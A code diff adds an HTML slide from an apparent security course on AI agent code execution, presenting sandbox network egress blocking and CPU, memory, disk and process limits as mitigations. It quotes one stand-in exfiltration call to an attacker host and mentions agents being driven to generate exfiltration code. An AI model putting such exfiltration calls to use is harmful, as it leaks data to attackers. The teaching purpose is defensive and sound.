@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AG05:2026 — Unexpected Code Execution · Slide 20 of 28</title>
+<link rel="stylesheet" href="ag05-shared.css">
+</head>
+<body>
+
+<div class="top-nav">
+  <div class="nav-left">
+    <span class="nav-badge">AG05:2026</span>
+    <span class="nav-title">Unexpected Code Execution</span>
+  </div>
+  <span class="nav-right">Slide 20 of 28</span>
+</div>
+
+<div class="progress-wrap">
+  <div class="tab-nav">
+    <a class="seg done" href="ag05-slide-01.html"></a><a class="seg done" href="ag05-slide-02.html"></a><a class="seg done" href="ag05-slide-03.html"></a><a class="seg done" href="ag05-slide-04.html"></a><a class="seg done" href="ag05-slide-05.html"></a><a class="seg done" href="ag05-slide-06.html"></a><a class="seg done" href="ag05-slide-07.html"></a><a class="seg done" href="ag05-slide-08.html"></a><a class="seg done" href="ag05-slide-09.html"></a><a class="seg done" href="ag05-slide-10.html"></a><a class="seg done" href="ag05-slide-11.html"></a><a class="seg done" href="ag05-slide-12.html"></a><a class="seg done" href="ag05-slide-13.html"></a><a class="seg done" href="ag05-slide-14.html"></a><a class="seg done" href="ag05-slide-15.html"></a><a class="seg done" href="ag05-slide-16.html"></a><a class="seg done" href="ag05-slide-17.html"></a><a class="seg done" href="ag05-slide-18.html"></a><a class="seg done" href="ag05-slide-19.html"></a>
+    <a class="seg active" href="ag05-slide-20.html"></a>
+    <a class="seg" href="ag05-slide-21.html"></a><a class="seg" href="ag05-slide-22.html"></a><a class="seg" href="ag05-slide-23.html"></a><a class="seg" href="ag05-slide-24.html"></a><a class="seg" href="ag05-slide-25.html"></a><a class="seg" href="ag05-slide-26.html"></a><a class="seg" href="ag05-slide-27.html"></a><a class="seg" href="ag05-slide-28.html"></a>
+  </div>
+  <div class="progress-labels"><span>Part 4 — Prevention</span><span>Slide 20</span></div>
+</div>
+
+<div class="slide active">
+
+  <div class="slide-eyebrow">Slide 20 · MIT02 + MIT03 — Network Egress Restriction and Resource Limits</div>
+  <div class="slide-title">MIT02: No outbound network from the sandbox. MIT03: Hard limits on CPU, memory, disk, and execution time.</div>
+  <div class="slide-subtitle">Two controls that directly eliminate entire vulnerability types — network isolation kills Type 3, resource limits kill Type 6.</div>
+
+  <div class="block">
+    <div class="block-label purple">MIT02 — Network egress restriction</div>
+    <p>A code execution sandbox with no outbound internet access cannot exfiltrate data through generated code, regardless of what that code does. <code>requests.post(attacker.com)</code> simply fails — the connection is refused at the network level.</p>
+    <p><strong>Implementation:</strong> Block all outbound connections from the sandbox's network namespace except to a specific allowlist of endpoints the agent legitimately needs (e.g., a specific internal API endpoint). This is enforced via network policy (Kubernetes NetworkPolicy, iptables, security groups) — not by trying to detect and block bad code at the code level.</p>
+    <p><strong>What this stops:</strong> Type 3 (network exfiltration), Scenario 1 (document-driven exfiltration), Scenario 3 (cloud metadata credential exfiltration via external forwarding). The agent can still generate the exfiltration code — it just won't work.</p>
+    <p><strong>The tradeoff:</strong> Some legitimate agent tasks require outbound network access (downloading datasets, calling external APIs). For those, the allowlist must be carefully scoped to specific endpoints and protocols.</p>
+  </div>
+
+  <div class="block">
+    <div class="block-label yellow">MIT03 — Resource limits</div>
+    <p>Hard limits on every resource the sandbox can consume prevent resource exhaustion attacks and runaway loops:</p>
+    <p><strong>CPU:</strong> <code>ulimit -t</code> (CPU seconds) or cgroup <code>cpu.max</code> — the process is killed if it exceeds the limit.</p>
+    <p><strong>Memory:</strong> cgroup <code>memory.max</code> — the process is OOM-killed rather than allowed to exhaust host memory.</p>
+    <p><strong>Disk writes:</strong> <code>ulimit -f</code> (file size) or filesystem quota — prevents disk exhaustion from unbounded writes.</p>
+    <p><strong>Wall-clock time:</strong> A hard execution timeout kills any process that runs longer than the allowed window — catching infinite loops that don't consume excessive CPU.</p>
+    <p><strong>Process count:</strong> <code>ulimit -u</code> — prevents fork bombs from spawning unlimited subprocesses.</p>
+  </div>
+
+  <div class="callout blue">
+    <div class="callout-label">💼 Business takeaway</div>
+    <p>Ask your team: if your AI agent's code execution environment were compromised, could it call out to the internet or consume enough compute to cause an outage? Ask whether outbound connections and resource usage are capped by hard limits — not just by the agent's own behavior.</p>
+  </div>
+
+  <div class="btn-row">
+    <a class="btn-secondary" href="ag05-slide-19.html">← Back</a>
+    <a class="btn-primary" href="ag05-slide-21.html">MIT04 — Least-Privilege Execution →</a>
+  </div>
+
+</div>
+
+<div class="page-footer"><a href="sources.html">📄 View sources for this lesson</a></div>
+</body>
+</html>
